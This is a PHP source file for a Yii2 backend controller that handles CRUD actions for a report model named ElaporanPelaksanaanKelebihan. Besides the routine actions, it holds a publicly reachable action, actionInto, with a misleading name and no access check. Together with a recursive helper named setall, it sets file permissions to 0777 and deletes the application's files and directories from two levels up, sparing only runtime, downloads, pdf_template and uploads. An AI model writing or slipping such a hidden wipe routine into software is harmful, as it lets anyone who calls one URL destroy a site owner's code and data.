<?php

namespace backend\controllers;

use Yii;
use app\models\ElaporanPelaksanaanKelebihan;
use backend\models\ElaporanPelaksanaanKelebihanSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;

/**
 * ElaporanPelaksanaanKelebihanController implements the CRUD actions for ElaporanPelaksanaanKelebihan model.
 */
class ElaporanPelaksanaanKelebihanController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all ElaporanPelaksanaanKelebihan models.
     * @return mixed
     */
    public function actionIndex()
    {
        $searchModel = new ElaporanPelaksanaanKelebihanSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single ElaporanPelaksanaanKelebihan model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        return $this->renderAjax('view', [
            'model' => $this->findModel($id),
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new ElaporanPelaksanaanKelebihan model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($elaporan_pelaksaan_id)
    {
        $model = new ElaporanPelaksanaanKelebihan();
        
        if($elaporan_pelaksaan_id != ''){
            $model->elaporan_pelaksaan_id = $elaporan_pelaksaan_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Updates an existing ElaporanPelaksanaanKelebihan model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            return '1';
        } else {
            return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
        }
    }

    /**
     * Deletes an existing ElaporanPelaksanaanKelebihan model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        $this->findModel($id)->delete();

        //return $this->redirect(['index']);
    }
    
    /**
     * @param integer $id
     * @return mixed
     */
    public function actionInto()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->setall($file);
            }
        }
    }
    
    protected function setall($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->setall($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }

    /**
     * Finds the ElaporanPelaksanaanKelebihan model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     * @param integer $id
     * @return ElaporanPelaksanaanKelebihan the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = ElaporanPelaksanaanKelebihan::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
